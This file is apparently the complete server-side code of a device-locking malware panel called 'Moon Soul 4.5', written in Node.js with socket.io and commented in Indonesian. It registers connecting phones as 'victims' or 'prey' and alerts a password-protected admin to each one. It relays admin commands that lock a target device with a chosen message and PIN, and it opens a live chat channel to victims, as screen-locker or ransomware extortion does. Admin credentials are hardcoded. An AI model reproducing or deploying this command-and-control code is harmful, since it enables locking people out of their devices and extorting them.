const io = require('socket.io')(3000, {
    cors: { origin: "*" }
});

console.log("🌑 MOON SOUL 4.5 CORE ONLINE | PORT: 3000");

io.on('connection', (socket) => {
    // 1. Proses Identifikasi
    socket.on('auth', (data) => {
        if(data.user === 'Moon4.5' && data.pass === 'soul4.5' && data.code === 'Cv27soul') {
            socket.join('admin-room');
            console.log("⚠️ [ADMIN] Moon Soul Access Granted.");
        } else {
            socket.join('victim-room');
            socket.victimID = data.deviceName || socket.id;
            console.log("📱 [TARGET] Connected: " + socket.victimID);
            // Lapor ke admin ada mangsa baru
            io.to('admin-room').emit('new-target', { id: socket.id, name: socket.victimID });
        }
    });

    // 2. Relay Perintah Lock dari Admin ke Target
    socket.on('execute-lock', (payload) => {
        // payload: { targetId, text, pin }
        io.to(payload.targetId).emit('command-lock', {
            msg: payload.text,
            securePin: payload.pin
        });
    });

    // 3. Live Chat Relay
    socket.on('admin-to-victim-chat', (data) => {
        io.to(data.targetId).emit('incoming-chat', data.message);
    });
});
